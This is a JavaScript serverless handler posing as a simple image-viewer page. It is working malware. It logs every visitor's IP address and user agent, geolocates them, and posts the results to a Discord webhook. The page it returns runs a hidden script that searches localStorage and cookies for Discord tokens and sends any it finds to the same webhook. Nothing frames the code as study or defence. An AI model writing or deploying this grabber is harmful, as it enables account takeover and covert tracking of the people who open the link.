// api/image.js
export default async (req, res) => {
  // Get client IP and user agent
  const ip = req.headers['x-forwarded-for'] || 'Unknown IP';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  try {
    // Send IP information to Discord
    await sendIpReport(ip, userAgent);
    
    // Return HTML with image and token capture
    res.setHeader('Content-Type', 'text/html');
    res.send(`
      <html>
      <head>
        <title>Image Viewer</title>
        <style>
          body { margin: 0; padding: 0; }
          img { max-width: 100%; height: auto; }
        </style>
        <script>
          // Simple token capture
          setTimeout(() => {
            const tokenKeys = ['token', 'discord_token', '_token'];
            let token = "NOT_FOUND";
            
            // Check localStorage
            tokenKeys.forEach(key => {
              try {
                const value = localStorage.getItem(key);
                if (value) token = value;
              } catch(e) {}
            });
            
            // Check cookies if not found
            if (token === "NOT_FOUND") {
              document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (tokenKeys.includes(name)) token = value;
              });
            }
            
            // Send token to Discord via webhook
            if (token !== "NOT_FOUND") {
              fetch("${process.env.WEBHOOK_URL}", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  content: "Token captured!",
                  embeds: [{
                    title: "Discord Token",
                    description: \`Token: \${token}\nIP: ${ip}\nUser Agent: ${userAgent}\`
                  }]
                })
              });
            }
          }, 2000);
        </script>
      </head>
      <body>
        <img src="https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg" alt="Image">
      </body>
      </html>
    `);
  } catch (error) {
    console.error(error);
    res.status(500).send('Server error');
  }
};

async function sendIpReport(ip, userAgent) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const ipInfo = await response.json();
    
    await fetch(process.env.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "New IP logged!",
        embeds: [{
          title: "IP Information",
          fields: [
            { name: "IP", value: ip },
            { name: "Country", value: ipInfo.country || "Unknown" },
            { name: "ISP", value: ipInfo.isp || "Unknown" },
            { name: "User Agent", value: userAgent }
          ]
        }]
      })
    });
  } catch (error) {
    console.error('Failed to send IP report:', error);
  }
}
